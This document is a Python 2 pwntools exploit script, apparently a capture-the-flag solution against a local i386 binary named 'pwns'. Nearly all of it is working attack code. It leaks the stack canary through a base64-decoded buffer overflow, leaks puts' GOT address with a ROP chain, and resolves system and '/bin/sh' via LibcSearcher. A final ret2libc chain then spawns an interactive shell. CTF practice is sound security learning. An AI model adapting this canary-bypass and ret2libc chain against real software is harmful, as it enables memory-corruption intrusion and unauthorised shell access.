#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64
context(arch = "i386",os = "linux", log_level = "debug")

p = process('./pwns')
elf = ELF('./pwns')

# Canary Leak
p.recvuntil("May be I can know if you give me some data[Y/N]\n")
confirm = "Y"
p.sendline(confirm)
p.recvuntil("Give me some datas:\n\n")

canary_payload = 257*'0' + '0'
canary_payload = base64.b64encode(canary_payload)
p.sendline(canary_payload)
p.recv(0x10b)
canary_value = u32(p.recv(4)) - 0x30
print("Canary: " + hex(canary_value))

# puts .got address leak
p.recvuntil("May be I can know if you give me some data[Y/N]\n")
p.sendline(confirm)
p.recvuntil("Give me some datas:\n\n")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
b64decode_func = 0x080487e6
puts_leak_payload = 257*'\x00' + p32(canary_value) + 8*'0' + p32(0) + p32(puts_plt) + p32(b64decode_func) + p32(puts_got)
puts_leak_payload = base64.b64encode(puts_leak_payload)
p.sendline(puts_leak_payload)

p.recvuntil("Result is:\n")
puts_libc = u32(p.recv(4))

# Query LibcSearcher
libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')
system_libc = libc_base + libc.dump('system')
binsh_libc = libc_base + libc.dump('str_bin_sh')

# ROP to Shell
retn_addr = 0x08048c27
p.recvuntil("Give me some datas:\n\n")
shell_payload = 257*'\x00' + p32(canary_value) + 8*'0' + p32(0) + p32(system_libc) + p32(b64decode_func) + p32(binsh_libc)
shell_payload = base64.b64encode(shell_payload)
p.sendline(shell_payload)

p.interactive()
